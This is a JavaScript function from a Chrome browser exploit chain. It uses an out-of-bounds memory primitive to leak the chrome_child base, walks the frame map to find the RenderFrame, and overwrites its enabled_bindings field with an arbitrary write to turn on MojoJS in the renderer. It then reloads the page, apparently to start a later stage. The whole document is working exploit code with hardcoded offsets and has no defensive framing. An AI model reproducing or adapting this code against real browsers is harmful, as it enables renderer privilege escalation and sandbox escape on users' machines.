async function enable_mojo(oob) {
  log('[enabling_mojo]', 'small');

  let window_ptr = oob._addrOf(window);
  log('[*] window_ptr:        0x' + window_ptr.toString(16), 'small');

  let chrome_child_base = oob._arb_read(window_ptr + 0x20n) - 0x052ef428n;
  log('[*] chrome_child:      0x' + chrome_child_base.toString(16), 'small');

  let g_frame_map = chrome_child_base + 0x05398998n
  log('[*] g_frame_map:       0x' + g_frame_map.toString(16), 'small');

  if (oob._arb_read(g_frame_map) != g_frame_map + 0x8n) {
    return;
  }

  g_frame_map += 0x8n;
  log('[*] pointer to actual g_frame_map (cause lazy instance):     0x' + g_frame_map.toString(16), 'small');

  let begin_ptr = oob._arb_read(g_frame_map);
  log('[*] First Node (ignore):         0x' + begin_ptr.toString(16), 'small');

  let actual_ptr = oob._arb_read(begin_ptr + 0x8n);
  log('[*] Second Node (this is the one): 0x' + actual_ptr.toString(16), 'small');

  render_frame_ptr = oob._arb_read(actual_ptr + 0x28n);
  log('[*] render_frame_ptr:  0x' + render_frame_ptr.toString(16), 'small');

  const kEnabledBindingsOffset = 0x6f0n;
  log('[*] enabled_bindings_ptr:      0x' + (render_frame_ptr + kEnabledBindingsOffset).toString(16), 'small');
  let enabled_bindings = oob._arb_read(render_frame_ptr + kEnabledBindingsOffset);
  log('[*] enabled_bindings:  0b' + enabled_bindings.toString(2), 'small');
  log('[*] enabled_bindings:  0x' + enabled_bindings.toString(16), 'small');

  let [lower, upper] = myftoi(itof(enabled_bindings));
  oob._arb_writ(render_frame_ptr + kEnabledBindingsOffset, ftoi(myitof(0x2, upper)));  

  enabled_bindings = oob._arb_read(render_frame_ptr + kEnabledBindingsOffset);
  log('[*] enabled_bindings:  0b' + enabled_bindings.toString(2), 'small');
  log('[*] enabled_bindings:  0x' + enabled_bindings.toString(16), 'small');
  log('[*] We have reached the end!', 'small');

  window.setInterval(function() {
    document.getElementById( 'bottom' ).scrollIntoView();
  }, 1000);

  for (let counter = 0; counter < 3; counter += 1) {
    log(`[+] Restarting in ${3-counter}s`, 'small');
    await sleep(1000);
  }

  window.location.reload();
}
